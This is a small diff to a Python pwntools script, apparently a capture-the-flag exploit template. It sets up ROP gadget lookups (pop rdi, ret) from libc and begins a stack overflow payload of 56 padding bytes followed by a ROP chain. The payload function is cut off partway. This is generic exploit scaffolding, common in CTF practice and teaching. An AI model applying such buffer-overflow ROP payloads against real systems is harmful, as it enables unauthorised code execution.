@@ -1,13 +1,16 @@
-# Contains only the things pwninit doesn't do for us automatically
+from pwn import *
 
-# So gdb.attach() spawns a horizontal split in tmux
-context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
+exe = None
+libc = None
+
+# one is probably enough
+rop_libc = ROP(libc)
+rop_exe = ROP(exe)
 
 offset = 56
-pop_rdi = 0x40142b
-ret = 0x401016
+pop_rdi = rop_libc.rdi.address
+ret = rop_libc.ret.address
 
-# Copy pasta to pwninit solve.py script
 def pwn(r): # r is remote
     payload1 = b"A"*offset
     payload1 += p64(pop_rdi)
